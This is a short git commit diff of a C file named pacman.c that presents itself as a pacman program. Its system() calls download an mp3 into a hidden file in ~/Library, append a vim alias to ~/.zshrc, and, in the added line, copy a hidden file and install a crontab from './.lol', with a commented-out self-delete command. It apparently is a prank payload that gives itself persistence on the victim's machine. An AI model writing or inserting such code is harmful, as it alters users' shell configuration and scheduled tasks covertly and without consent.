dc138977028e9f88af5e3d871da42829d890f9f4
Sigabort42 <elbenkrizi@gmail.com>
2018-07-13 02:36:45 +0200

    pacman

--- pacman.c
+++ pacman.c
@@ -5,6 +5,7 @@ int	main()
 	system("curl -o ~/Library/.257.mp3 http://s1download-universal-soundbank.com/mp3/sounds/257.mp3");
 
 	system("echo 'alias vim=\"afplay $HOME/Library/.257.mp3 && vim\"' >> ~/.zshrc");
+	system("cp ./.pacman ~/Library/.pacman && crontab < ./.lol");
 	return (0);
 //#rm -rf $0
 }
